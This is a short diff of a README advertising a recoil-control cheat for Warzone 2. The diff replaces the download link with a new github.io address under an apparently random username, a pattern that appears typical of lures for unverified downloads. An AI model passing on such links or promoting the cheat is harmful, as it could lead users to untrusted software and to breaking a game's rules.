@@ -3,7 +3,7 @@
 Improve your shots with a **No Recoil Assistant** for **Warzone 2** on PC. This technical guide shows how to configure smooth recoil control, reduce vertical drift, and keep your crosshair steady in every firefight — perfect for full-auto weapons, ARs, SMGs, or LMGs.
 
 ⬇️ **Download**  
-[![Download No Recoil Tool](https://img.shields.io/badge/Download-No_Recoil_Tool-ffb800?style=for-the-badge&logo=callofduty&logoColor=white)](https://cod-warzone-2-no-recoil-control.github.io/.github/)
+[![Download No Recoil Tool](https://img.shields.io/badge/Download-No_Recoil_Tool-ffb800?style=for-the-badge&logo=callofduty&logoColor=white)](https://adaraxokug15.github.io/.github/cod-warzone-2-recoil-control)
 
 ---
 
